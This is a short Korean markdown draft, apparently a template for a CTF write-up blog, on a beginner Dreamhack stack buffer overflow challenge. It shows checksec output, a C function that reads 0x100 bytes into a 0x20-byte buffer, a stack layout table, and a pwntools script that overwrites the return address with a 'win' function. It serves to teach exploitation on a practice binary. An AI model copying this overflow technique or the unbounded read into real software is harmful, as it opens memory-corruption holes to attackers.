---
title: example-stack-bof
description: 예시 글
platform: Dreamhack
category: pwn
level: 1
date: 2026-11-15
tags: [bof]
draft: true
---

> [!NOTE] 예시 글
> 마크다운이 어떻게 보이는지 확인하는 용도입니다. `draft: true` 라서 사이트에는 올라가지 않습니다.

## 문제

```bash
$ checksec ./chall
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

## 분석

```c
int main() {
    char buf[0x20];
    read(0, buf, 0x100);
    return 0;
}
```

| 오프셋 | 내용 |
| --- | --- |
| `rbp-0x20` | `buf` |
| `rbp` | saved RBP |
| `rbp+0x8` | return address |

> [!WARNING]
> 64비트에서 `system` 호출 전에 스택이 16바이트로 정렬되어 있어야 합니다.

## 풀이

```python
from pwn import *

p = process('./chall')
e = ELF('./chall')
p.send(b'A' * 0x28 + p64(e.symbols['win']))
p.interactive()
```

## 정리

- 보호 기법부터 확인한다.
